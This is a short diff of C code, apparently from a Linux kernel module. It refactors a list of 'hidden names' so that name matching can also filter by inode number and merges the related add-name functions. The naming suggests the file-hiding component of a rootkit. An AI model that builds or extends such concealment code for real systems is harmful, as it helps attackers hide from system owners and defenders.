@@ -138,10 +138,15 @@ struct hidden_names {
 bool fs_search_name(const char *name, u64 ino) {
     struct hidden_names *node, *node_safe;
     list_for_each_entry_safe(node, node_safe, &names_node, list) {
+
         /** This will match any string starting with pattern */
-        if (!strncmp(node->name, name, strlen(node->name)))
-            return true;
+        if (!strncmp(node->name, name, strlen(node->name))) {
+            /** and this will filter by inode number, if set. */
+            if (0 == node->ino || ino == node->ino)
+                return true; /** found match */
+        }
     }
+    /** not found */
     return false;
 }
 
@@ -182,16 +187,12 @@ err:
     return -EINVAL;
 }
 
-int fs_add_name_ro(const char *names[]) {
-    return _fs_add_name(names, true, 0UL);
-}
-
-int fs_add_name_rw(const char *names[]) {
-    return _fs_add_name(names, false, 0UL);
-}
-
-int fs_add_name_ino_ro(const char *names[], u64 ino) {
+int fs_add_name_ro(const char *names[], u64 ino) {
     return _fs_add_name(names, true, ino);
+}
+
+int fs_add_name_rw(const char *names[], u64 ino) {
+    return _fs_add_name(names, false, ino);
 }
 
 bool fs_del_name(const char *names[]) {
